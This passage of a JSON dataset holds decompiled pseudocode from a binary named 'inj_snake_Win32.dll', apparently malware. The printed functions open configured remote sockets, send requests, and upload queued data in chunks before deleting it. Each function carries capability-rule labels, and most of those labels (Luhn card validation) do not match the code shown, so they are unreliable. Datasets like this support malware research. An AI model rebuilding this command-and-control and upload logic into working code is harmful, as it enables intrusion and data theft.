        "decompiled_code": "\nuint __cdecl fcn.20004ad3(uint src, int32_t s)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    char *pcVar6;\n    uint arg_18h;\n    uint var_18h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = (*_sym.imp.msvcrt.dll__strdup)(src);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    puVar3 = (*_sym.imp.ntdll.dll_strchr)(iVar2, 0x2f);\n    if (puVar3 == NULL) {\n        (*_sym.imp.msvcrt.dll_free)(iVar2);\n    }\n    else {\n        *puVar3 = 0;\n        arg_18h = 1;\n        var_8h = 0;\n        var_ch = iVar2;\n        iVar4 = sub.ntdll.dll_strlen(puVar3 + 1);\n        iVar4 = sym.inj_snake_Win32.dll_ts_socket(&var_4h, &var_ch, puVar3 + 1, iVar4 + 1, arg_18h);\n        (*_sym.imp.msvcrt.dll_free)(iVar2);\n        if (iVar4 == 0) {\n            if (s != 0) {\n                iVar2 = sub.ntdll.dll_strlen(s);\n                pcVar5 = (*_sym.imp.msvcrt.dll_malloc)(iVar2 + 2);\n                if (pcVar5 == NULL) {\n                    sym.inj_snake_Win32.dll_t_close(&var_4h, 0);\n                    return 0;\n                }\n                sub.ntdll.dll_strcpy(pcVar5, s);\n                pcVar5[iVar2 + 1] = '\\0';\n                cVar1 = *pcVar5;\n                pcVar6 = pcVar5;\n                while (cVar1 != '\\0') {\n                    if (*pcVar6 == ',') {\n                        *pcVar6 = '\\0';\n                    }\n                    pcVar6 = pcVar6 + 1;\n                    cVar1 = *pcVar6;\n                }\n                iVar2 = sym.inj_snake_Win32.dll_t_setoptlist(var_4h, pcVar5, 0);\n                if (iVar2 != 0) {\n                    sym.inj_snake_Win32.dll_snake_log(8, 0, iVar2, 0, 0);\n                    (*_sym.imp.msvcrt.dll_free)(pcVar5);\n                    sym.inj_snake_Win32.dll_t_close(&var_4h, 0);\n                    return 0;\n                }\n                (*_sym.imp.msvcrt.dll_free)(pcVar5);\n            }\n            sub.ntdll.dll_memset(&var_18h, 0, 0xc);\n            var_18h = 0x20004772;\n            sym.inj_snake_Win32.dll_t_setoptbin(var_4h, 2, &var_18h, 0xc, 0);\n            sym.inj_snake_Win32.dll_t_setoptbin(var_4h, 5, 0x2000478c, 0, 0);\n            iVar2 = sym.inj_snake_Win32.dll_ts_start(var_4h, fcn.200045f1, 0, 0);\n            if (iVar2 == 0) {\n                return var_4h;\n            }\n            sym.inj_snake_Win32.dll_snake_log(8, 0, iVar2, 0, 0);\n            sym.inj_snake_Win32.dll_t_close(&var_4h, 0);\n        }\n        else {\n            sym.inj_snake_Win32.dll_snake_log(8, 0, iVar4, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 857
    },
    "20004dcb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.20004dcb(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint var_208h;\n    uint var_108h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = sym.inj_snake_Win32.dll_config_read_uint32(100, 0);\n    if (var_4h != 0) {\n        iVar3 = 0x70;\n        piVar2 = 0x20046c2c;\n        do {\n            iVar1 = sym.inj_snake_Win32.dll_config_read(iVar3 + -0xb, &var_208h, 0x100, &var_8h);\n            if (iVar1 == 0) {\n                var_108h._0_1_ = 0;\n                sym.inj_snake_Win32.dll_config_read(iVar3, &var_108h, 0x100, &var_8h);\n                iVar1 = fcn.20004ad3(&var_208h, &var_108h);\n                *piVar2 = iVar1;\n                if (iVar1 != 0) {\n                    piVar2 = piVar2 + 1;\n                }\n            }\n            iVar3 = iVar3 + 1;\n            var_4h = var_4h + -1;\n        } while (var_4h != 0);\n    }\n    return;\n}\n",
        "token_count": 336
    },
    "20005332": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.20005332(void)\n\n{\n    code *pcVar1;\n    uint *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    pcVar1 = _sym.imp.WS2_32.dll_htonl;\n    uVar2 = (*_sym.imp.WS2_32.dll_htonl)(*in_EAX);\n    *in_EAX = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[1]);\n    in_EAX[1] = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[2]);\n    in_EAX[2] = uVar2;\n    uVar2 = (*pcVar1)(*(in_EAX + 0xd));\n    *(in_EAX + 0xd) = uVar2;\n    uVar2 = (*pcVar1)(*(in_EAX + 0x11));\n    *(in_EAX + 0x11) = uVar2;\n    uVar2 = (*pcVar1)(*(in_EAX + 0x15));\n    *(in_EAX + 0x15) = uVar2;\n    uVar2 = (*pcVar1)(*(in_EAX + 0x19));\n    *(in_EAX + 0x19) = uVar2;\n    uVar2 = (*pcVar1)(*(in_EAX + 0x1d));\n    *(in_EAX + 0x1d) = uVar2;\n    puVar4 = in_EAX + 0x21;\n    iVar3 = 4;\n    do {\n        uVar2 = (*pcVar1)(*puVar4);\n        *puVar4 = uVar2;\n        puVar4 = puVar4 + 1;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    return;\n}\n",
        "token_count": 417
    },
    "20005391": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.20005391(void)\n\n{\n    code *pcVar1;\n    uint *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    pcVar1 = _sym.imp.WS2_32.dll_ntohl;\n    uVar2 = (*_sym.imp.WS2_32.dll_ntohl)(*in_EAX);\n    *in_EAX = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[1]);\n    in_EAX[1] = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[2]);\n    in_EAX[2] = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[3]);\n    in_EAX[3] = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[8]);\n    in_EAX[8] = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[9]);\n    in_EAX[9] = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[10]);\n    in_EAX[10] = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[0xb]);\n    in_EAX[0xb] = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[0xc]);\n    in_EAX[0xc] = uVar2;\n    puVar4 = in_EAX + 4;\n    iVar3 = 4;\n    do {\n        uVar2 = (*pcVar1)(*puVar4);\n        *puVar4 = uVar2;\n        puVar4 = puVar4 + 1;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    return;\n}\n",
        "token_count": 405
    },
    "200055a6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.200055a6(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    ulong uVar4;\n    uint s;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = sym.inj_snake_Win32.dll_config_read_uint32(1, 0);\n    iVar2 = sym.inj_snake_Win32.dll_qm_enum(uVar1, 0, &var_ch, &var_4h);\n    if (iVar2 == 0) {\n        var_8h = 0;\n        if (var_ch != 0) {\n            iVar2 = 0;\n            do {\n                puVar3 = var_4h + iVar2;\n                if (puVar3[0xc] == puVar3[0xb]) {\n                    fcn.200053f8(*puVar3, puVar3[1], puVar3[0xb], puVar3[3]);\n                }\n                else {\n                    uVar4 = (*_sym.imp.msvcrt.dll__time64)(0);\n                    var_10h = uVar4 >> 0x20;\n                    puVar3 = var_4h + iVar2;\n                    if (uVar4 - puVar3[8] < 0x93a81) {\n                        if (var_8h == var_ch - 1) break;\n                        sym.inj_snake_Win32.dll_snake_log(5, 0, 0x215901f6, 0, puVar3[3]);\n                        puVar3 = var_4h + iVar2;\n                        sym.inj_snake_Win32.dll_qm_rm(*puVar3, puVar3[2], puVar3[1]);\n                    }\n                    else {\n                        sym.inj_snake_Win32.dll_qm_rm(*puVar3, puVar3[2], puVar3[1]);\n                        sym.inj_snake_Win32.dll_snake_log(5, 0x21590204, 0x21590002, 0, *(iVar2 + 0xc + var_4h));\n                        sub.ntdll.dll_memset(&s, 0, 0x10);\n                        s = 0x21590204;\n                        sym.inj_snake_Win32.dll_qm_push\n                                  (0xffffffff, 1, *(var_4h + iVar2 + 0xc), 0, 0, var_4h + iVar2 + 0x10);\n                    }\n                }\n                var_8h = var_8h + 1;\n                iVar2 = iVar2 + 0x40;\n            } while (var_8h < var_ch);\n        }\n        sym.inj_snake_Win32.dll_qm_free(var_4h);\n    }\n    return;\n}\n",
        "token_count": 635
    },
    "200056c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.200056c0(uint *param_1, int32_t param_2, int32_t *param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint uVar8;\n    char acStack404 [256];\n    uchar auStack148 [128];\n    uchar *puStack20;\n    uint uStack16;\n    int32_t iStack12;\n    uchar auStack8 [4];\n    \n    if (param_2 == 0) {\n        uVar8 = 200;\n    }\n    else {\n        uVar8 = 300;\n    }\n    iVar2 = sym.inj_snake_Win32.dll_config_read_uint32(uVar8, 0);\n    if (iVar2 == 0) {\n        uVar3 = 0x21590064;\n    }\n    else {\n        iVar4 = fcn.200018bf();\n        iVar4 = iVar4 % iVar2;\n        iVar2 = iVar4 + 0xc9;\n        if (param_2 != 0) {\n            iVar2 = iVar4 + 0x12d;\n        }\n        iStack12 = iVar4;\n        iVar2 = sym.inj_snake_Win32.dll_config_read(iVar2, auStack148, 0x80, auStack8);\n        if (iVar2 == 0) {\n            acStack404[0] = '\\0';\n            iVar2 = iVar4 + 0xd4;\n            if (param_2 != 0) {\n                iVar2 = iVar4 + 0x138;\n            }\n            sym.inj_snake_Win32.dll_config_read(iVar2, acStack404, 0x100, auStack8);\n            puVar5 = (*_sym.imp.ntdll.dll_strchr)(auStack148, 0x2f);\n            if (puVar5 == NULL) {\n                uVar3 = 0x21590064;\n            }\n            else {\n                *puVar5 = 0;\n                puStack20 = auStack148;\n                uVar8 = 1;\n                uStack16 = 0;\n                iVar2 = sub.ntdll.dll_strlen(puVar5 + 1);\n                uVar3 = sym.inj_snake_Win32.dll_tc_socket(param_1, &puStack20, puVar5 + 1, iVar2 + 1, uVar8);\n                if (uVar3 == 0) {\n                    if (acStack404[0] != '\\0') {\n                        iVar2 = sub.ntdll.dll_strlen(acStack404);\n                        pcVar6 = (*_sym.imp.msvcrt.dll_malloc)(iVar2 + 2);\n                        if (pcVar6 == NULL) {\n                            sym.inj_snake_Win32.dll_t_close(param_1, 0);\n                            return 0x21590004;\n                        }\n                        sub.ntdll.dll_strcpy(pcVar6, acStack404);\n                        pcVar6[iVar2 + 1] = '\\0';\n                        cVar1 = *pcVar6;\n                        pcVar7 = pcVar6;\n                        while (cVar1 != '\\0') {\n                            if (*pcVar7 == ',') {\n                                *pcVar7 = '\\0';\n                            }\n                            pcVar7 = pcVar7 + 1;\n                            cVar1 = *pcVar7;\n                        }\n                        uVar3 = sym.inj_snake_Win32.dll_t_setoptlist(*param_1, pcVar6, 0);\n                        (*_sym.imp.msvcrt.dll_free)(pcVar6);\n                        iVar4 = iStack12;\n                        if (uVar3 != 0) {\n                            sym.inj_snake_Win32.dll_t_close(param_1, 0);\n                            sym.inj_snake_Win32.dll_snake_log(1, 0, uVar3, 0, 0);\n                            return uVar3;\n                        }\n                    }\n                    if (param_3 != NULL) {\n                        *param_3 = iVar4 + 1000000000;\n                    }\n                    uVar3 = 0;\n                }\n                else {\n                    sym.inj_snake_Win32.dll_snake_log(1, 0, uVar3, 0, 0);\n                }\n            }\n        }\n        else {\n            uVar3 = iVar2 + 0x191U | 0x21590000;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 984
    },
    "20005886": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20005886(uint arg_8h)\n\n{\n    uint s;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    sub.ntdll.dll_memset(&s, 0, 0x1c);\n    var_10h = &var_ch;\n    var_ch = arg_8h;\n    var_1ch = 9;\n    var_18h = 2;\n    var_14h = 4;\n    sym.inj_snake_Win32.dll_snake_modules_command(0, 0x403, &s, &var_4h, 0, 0, 0);\n    return;\n}\n",
        "token_count": 172
    },
    "200058d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.200058d8(void)\n\n{\n    uint32_t arg_14h;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t arg_10h;\n    uchar auStack212 [4];\n    uint uStack208;\n    uint32_t uStack200;\n    uint32_t uStack168;\n    uint32_t uStack164;\n    uchar auStack148 [4];\n    uint32_t uStack144;\n    uchar uStack140;\n    uint32_t uStack127;\n    uint uStack123;\n    uint32_t uStack119;\n    uint8_t uStack115;\n    uint32_t uStack114;\n    int32_t iStack110;\n    uint uStack106;\n    int32_t iStack102;\n    uint32_t uStack64;\n    uint uStack60;\n    uint32_t uStack56;\n    int32_t iStack52;\n    uint32_t uStack48;\n    int32_t iStack44;\n    uint uStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uint32_t uStack28;\n    uint uStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uint32_t uStack8;\n    \n    uStack24 = 0;\n    uStack56 = 0;\n    uStack48 = 0;\n    *0x200471b4 = 0;\n    do {\n        iStack20 = 0;\n        iStack44 = 0;\n        sub.ntdll.dll_memset(auStack148, 0, 0x52);\n        uVar1 = sym.inj_snake_Win32.dll_config_read_uint32(1, 0);\n        uStack40 = sym.inj_snake_Win32.dll_config_read_uint32(400, 20000);\n        uStack60 = sym.inj_snake_Win32.dll_config_read_uint32(0xe1, 0x1000);\n        iStack52 = sym.inj_snake_Win32.dll_config_read_uint32(0xe2, 0x10000);\n        uStack115 = 1;\n        iVar2 = sym.inj_snake_Win32.dll_config_read_uint32(2, 0);\n        uStack119 = iVar2 + 1;\n        uStack8 = 0;\n        uStack28 = 0;\n        iVar2 = sym.inj_snake_Win32.dll_qm_find_first(uVar1, 0, 0, auStack212);\n        while (iVar2 == 0) {\n            if (uStack164 < uStack168) {\n                iStack110 = uStack168 - uStack164;\n                uStack119 = uStack200;\n                uStack115 = 0;\n                uStack114 = uStack164;\n                uStack24 = uStack208;\n                iStack44 = 1;\n                uStack8 = uStack200;\n                uStack28 = uStack164;\n                uStack56 = uStack168;\n                break;\n            }\n            fcn.200053f8(uVar1, uStack208, uStack168, uStack200);\n            iVar2 = sym.inj_snake_Win32.dll_qm_find_first(uVar1, 0, 0, auStack212);\n        }\n        if ((*0x200471b4 == 0) && (iVar2 = fcn.200056c0(0x200471b4, 0, &uStack48),  iVar2 != 0)) break;\n        uStack115 = uStack115 | 0x1a;\n        uStack144 = uVar1 | 0x80000000;\n        uStack106 = uStack60;\n        uStack140 = 1;\n        uStack123 = 0;\n        iStack102 = iStack52;\n        uStack127 = uVar1;\n        fcn.20005313();\n        fcn.20005332();\n        iVar2 = sym.inj_snake_Win32.dll_tc_send_request(*0x200471b4, 0xb, auStack148, 0x52, &uStack12, 0);\n        if (iVar2 != 0) {\n            uVar1 = uStack8;\n            if (uStack8 == 0) {\n                uVar1 = uStack48 | 0x80000000;\n            }\n            sym.inj_snake_Win32.dll_snake_log(2, 0, iVar2, 0, uVar1);\n            break;\n        }\n        iVar2 = sym.inj_snake_Win32.dll_tc_read_request_pipe(*0x200471b4, uStack12, &iStack20, &uStack64, uStack40, 0);\n        arg_10h = uStack8;\n        if (iVar2 == 0) {\n            if (uStack64 < 0x40) {\n                if (uStack8 == 0) {\n                    arg_10h = uStack48 | 0x80000000;\n                }\n                uVar1 = 0x215901f5;\ncode_r0x20005ab4:\n                sym.inj_snake_Win32.dll_snake_log(2, 0, uVar1, 0, arg_10h);\n                sym.inj_snake_Win32.dll_tc_cancel(*0x200471b4, uStack12);\n                break;\n            }\n            fcn.20005391();\n            arg_14h = *(iStack20 + 0x2c);\n            if (*(iStack20 + 0x30) < arg_14h) {\n                sym.inj_snake_Win32.dll_tc_cancel(*0x200471b4, uStack12);\n                break;\n            }\n            arg_10h = uStack8;\n            if (iStack44 == 0) {\n                arg_10h = *(iStack20 + 0xc);\n                uStack56 = arg_14h;\n                iVar2 = sym.inj_snake_Win32.dll_qm_create(uVar1, 0, arg_10h, arg_14h, 0, &uStack24);\n                if (iVar2 != 0) {\n                    uVar1 = iVar2 + 0x191U | 0x21590000;\n                    goto code_r0x20005ab4;\n                }\n            }\n            while (uStack8 = sym.inj_snake_Win32.dll_tc_read_request_pipe\n                                       (*0x200471b4, uStack12, &uStack32, &iStack36, uStack40, 0),  uStack8 == 0) {\n                if (iStack36 == 0) goto code_r0x20005b6a;\n                iStack52 = sym.inj_snake_Win32.dll_qm_write(uVar1, 0, uStack24, uStack28, uStack32, iStack36);\n                sym.inj_snake_Win32.dll_tc_free_data(*0x200471b4, uStack32);\n                if (iStack52 != 0) break;\n                uStack28 = uStack28 + iStack36;\n            }\n            sym.inj_snake_Win32.dll_snake_log(2, 0, uStack8, 0, arg_10h);\n        }\ncode_r0x20005b6a:\n        uStack8 = 0;\n        iVar2 = sym.inj_snake_Win32.dll_tc_get_reply\n                          (*0x200471b4, uStack12, &iStack16, &uStack32, &iStack36, uStack40, 0);\n        if (iVar2 == 0) {\n            if (iStack16 == 0) {\n                if (uStack28 == uStack56) {\n                    fcn.200053f8(uVar1, uStack24, uStack56, arg_10h);\n                    uStack8 = 1;\n                }\n                else {\n                    sym.inj_snake_Win32.dll_snake_log(2, 0, 0x215901f6, 0, arg_10h);\n                    sym.inj_snake_Win32.dll_qm_rm(uVar1, 0, uStack24);\n                }\n            }\n            else {\n                if (iStack16 == 0x21590196) {\n                    if (iStack44 == 0) goto code_r0x20005c38;\n                    sym.inj_snake_Win32.dll_qm_rm(uVar1, 0, uStack24);\n                    sym.inj_snake_Win32.dll_snake_log(2, 0, iStack16, 0, arg_10h);\n                }\n                else if (iStack16 == 0x21590207) {\n                    fcn.2000a109(*0x200471b4);\n                }\n                if ((iStack16 != 0x21590196) && (iStack16 != 0x21590192)) {\n                    sym.inj_snake_Win32.dll_snake_log(2, 0, iStack16, 0, arg_10h);\n                }\n            }\ncode_r0x20005c38:\n            sym.inj_snake_Win32.dll_tc_free_data(*0x200471b4, uStack32);\n        }\n        else {\n            sym.inj_snake_Win32.dll_snake_log(2, 0, iVar2, 0, arg_10h);\n        }\n        sym.inj_snake_Win32.dll_tc_free_data(*0x200471b4, iStack20);\n        iStack20 = 0;\n    } while (uStack8 != 0);\n    if (*0x200471b4 != 0) {\n        sym.inj_snake_Win32.dll_tc_free_data(*0x200471b4, iStack20);\n        sym.inj_snake_Win32.dll_t_close(0x200471b4, 0);\n    }\n    return;\n}\n",
        "token_count": 2163
    },
    "20005ccc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.20005ccc(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *unaff_EBX;\n    uint32_t arg_14h;\n    uchar auStack268 [16];\n    int32_t iStack252;\n    uint32_t uStack224;\n    uint32_t uStack220;\n    uchar auStack204 [4];\n    uint uStack200;\n    uint uStack192;\n    int32_t iStack188;\n    uint32_t uStack160;\n    uint32_t uStack156;\n    uchar auStack140 [4];\n    uchar auStack136 [4];\n    uint32_t uStack132;\n    uchar uStack128;\n    uint uStack115;\n    uint uStack111;\n    uint uStack107;\n    uchar uStack103;\n    uint32_t uStack102;\n    int32_t iStack98;\n    uint32_t uStack86;\n    int32_t iStack82;\n    uint32_t uStack52;\n    uint32_t uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    int32_t iStack32;\n    uint32_t uStack28;\n    int32_t iStack24;\n    uint uStack20;\n    int32_t iStack16;\n    uint32_t uStack12;\n    uint uStack8;\n    \n    uStack12 = sym.inj_snake_Win32.dll_config_read_uint32(1, 0);\n    uStack44 = sym.inj_snake_Win32.dll_config_read_uint32(400, 20000);\n    uStack36 = sym.inj_snake_Win32.dll_config_read_uint32(0x143, 0x1000);\n    uStack28 = sym.inj_snake_Win32.dll_config_read_uint32(0x144, 0x10000);\n    iVar1 = sym.inj_snake_Win32.dll_qm_read_hdr(*in_EAX, in_EAX[2], in_EAX[1], auStack204);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    if (uStack156 != uStack160) {\n        return 1;\n    }\n    uStack8 = uStack192;\n    if ((*unaff_EBX == 0) && (iVar1 = fcn.200056c0(),  iVar1 != 0)) {\n        if (iVar1 == 0x21590064) {\n            return 1;\n        }\ncode_r0x20005d6a:\n        sym.inj_snake_Win32.dll_snake_log(4, 0, iVar1, 0, uStack192);\n        return 1;\n    }\n    sub.ntdll.dll_memset(auStack136, 0, 0x52);\n    uStack115 = 0xffffffff;\n    uStack132 = uStack12 | 0x80000000;\n    uStack107 = uStack192;\n    uStack128 = 2;\n    uStack111 = 1;\n    uStack103 = 4;\n    uStack52 = uStack132;\n    fcn.20005313();\n    fcn.20005332();\n    iVar1 = sym.inj_snake_Win32.dll_tc_transact\n                      (*unaff_EBX, 0xb, auStack136, 0x52, &iStack32, &uStack20, &uStack48, uStack44, 0);\n    if (iVar1 == 0) {\n        sub.ntdll.dll_memset(auStack136, 0, 0x52);\n        if (iStack32 == 0) {\n            if (uStack48 < 0x40) {\n                sym.inj_snake_Win32.dll_snake_log(4, 0, 0x215901f5, 0, uStack8);\n                sym.inj_snake_Win32.dll_tc_free_data(*unaff_EBX, uStack20);\n                return 1;\n            }\n            sub.ntdll.dll_memcpy(auStack268, uStack20, 0x40);\n            sym.inj_snake_Win32.dll_tc_free_data(*unaff_EBX, uStack20);\n            uStack20 = 0;\n            fcn.20005391();\n            if ((uStack224 != uStack160) || (iStack252 != iStack188)) {\n                iVar1 = 0x21590202;\n                uStack192 = uStack8;\n                goto code_r0x20005d6a;\n            }\n            uStack12 = uStack220;\n        }\n        else {\n            sym.inj_snake_Win32.dll_tc_free_data(*unaff_EBX, uStack20);\n            iStack82 = iStack188;\n            uStack20 = 0;\n            uStack12 = 0;\n            uStack103 = 1;\n        }\n        uStack115 = 0xffffffff;\n        uStack132 = uStack52;\n        uStack107 = uStack8;\n        iStack98 = uStack156 - uStack12;\n        uStack128 = 1;\n        uStack111 = 1;\n        uStack86 = uStack160;\n        uStack102 = uStack12;\n        fcn.20005313();\n        fcn.20005332();\n        iVar1 = sym.inj_snake_Win32.dll_tc_send_request(*unaff_EBX, 0xc, auStack136, 0x52, &uStack40, 0);\n        if (iVar1 == 0) {\n            iStack16 = (*_sym.imp.msvcrt.dll_malloc)(uStack28);\n            arg_14h = uStack12;\n            if (iStack16 != 0) {\n                while( true ) {\n                    if (uStack156 <= arg_14h) {\n                        (*_sym.imp.msvcrt.dll_free)(iStack16);\n                        iVar1 = sym.inj_snake_Win32.dll_tc_write_request_pipe(*unaff_EBX, uStack40, 0, 0, 0);\n                        if (iVar1 != 0) {\n                            sym.inj_snake_Win32.dll_snake_log(4, 0, iVar1, 0, uStack8);\n                        }\n                        uStack12 = 0;\n                        iVar1 = sym.inj_snake_Win32.dll_tc_get_reply\n                                          (*unaff_EBX, uStack40, &iStack32, &iStack16, auStack140, uStack44, 0);\n                        sym.inj_snake_Win32.dll_snake_log(4, iStack32, iVar1, 0, uStack8);\n                        if (iVar1 == 0) {\n                            sym.inj_snake_Win32.dll_tc_free_data(*unaff_EBX, iStack16);\n                            if (iStack32 == 0) {\n                                sym.inj_snake_Win32.dll_qm_rm(0xffffffff, 1, uStack200);\n                                uStack12 = 1;\n                                fcn.20005886(uStack8);\n                                return uStack12;\n                            }\n                            return uStack12;\n                        }\n                        return uStack12;\n                    }\n                    if (uStack36 < uStack28) {\n                        uVar2 = fcn.200018bf();\n                        iStack24 = uVar2 % ((uStack28 - uStack36) + 1) + uStack36;\n                    }\n                    else {\n                        uVar2 = fcn.200018bf();\n                        iStack24 = uVar2 % ((uStack36 - uStack28) + 1) + uStack28;\n                    }\n                    if (uStack156 < iStack24 + arg_14h) {\n                        iStack24 = uStack156 - arg_14h;\n                    }\n                    iVar1 = sym.inj_snake_Win32.dll_qm_read\n                                      (0xffffffff, 1, uStack200, arg_14h, iStack16, iStack24, &iStack24);\n                    if (iVar1 != 0) break;\n                    uVar2 = sym.inj_snake_Win32.dll_tc_write_request_pipe(*unaff_EBX, uStack40, iStack16, iStack24, 0);\n                    if (uVar2 != 0) goto code_r0x20006050;\n                    arg_14h = arg_14h + iStack24;\n                }\n                uVar2 = iVar1 + 0x191U | 0x21590000;\ncode_r0x20006050:\n                sym.inj_snake_Win32.dll_snake_log(4, 0, uVar2, 0, uStack8);\n                (*_sym.imp.msvcrt.dll_free)(iStack16);\n                return 0;\n            }\n            iVar1 = 0x21590004;\n        }\n    }\n    sym.inj_snake_Win32.dll_snake_log(4, 0, iVar1, 0, uStack8);\n    return 0;\n}\n",
        "token_count": 1945
    },
    "2000633e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.2000633e(void)\n\n{\n    code *pcVar1;\n    uint *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    pcVar1 = _sym.imp.WS2_32.dll_ntohl;\n    uVar2 = (*_sym.imp.WS2_32.dll_ntohl)(*in_EAX);\n    *in_EAX = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[1]);\n    in_EAX[1] = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[2]);\n    in_EAX[2] = uVar2;\n    uVar2 = (*pcVar1)(*(in_EAX + 0xd));\n    *(in_EAX + 0xd) = uVar2;\n    uVar2 = (*pcVar1)(*(in_EAX + 0x11));\n    *(in_EAX + 0x11) = uVar2;\n    uVar2 = (*pcVar1)(*(in_EAX + 0x15));\n    *(in_EAX + 0x15) = uVar2;\n    uVar2 = (*pcVar1)(*(in_EAX + 0x19));\n    *(in_EAX + 0x19) = uVar2;\n    uVar2 = (*pcVar1)(*(in_EAX + 0x1d));\n    *(in_EAX + 0x1d) = uVar2;\n    puVar4 = in_EAX + 0x21;\n    iVar3 = 4;\n    do {\n        uVar2 = (*pcVar1)(*puVar4);\n        *puVar4 = uVar2;\n        puVar4 = puVar4 + 1;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    return;\n}\n",
        "token_count": 416
    },
    "2000639d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.2000639d(void)\n\n{\n    code *pcVar1;\n    uint *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    pcVar1 = _sym.imp.WS2_32.dll_htonl;\n    uVar2 = (*_sym.imp.WS2_32.dll_htonl)(*in_EAX);\n    *in_EAX = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[1]);\n    in_EAX[1] = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[2]);\n    in_EAX[2] = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[3]);\n    in_EAX[3] = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[8]);\n    in_EAX[8] = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[9]);\n    in_EAX[9] = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[10]);\n    in_EAX[10] = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[0xb]);\n    in_EAX[0xb] = uVar2;\n    uVar2 = (*pcVar1)(in_EAX[0xc]);\n    in_EAX[0xc] = uVar2;\n    puVar4 = in_EAX + 4;\n    iVar3 = 4;\n    do {\n        uVar2 = (*pcVar1)(*puVar4);\n        *puVar4 = uVar2;\n        puVar4 = puVar4 + 1;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    return;\n}\n",
        "token_count": 408
    },
    "20006404": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
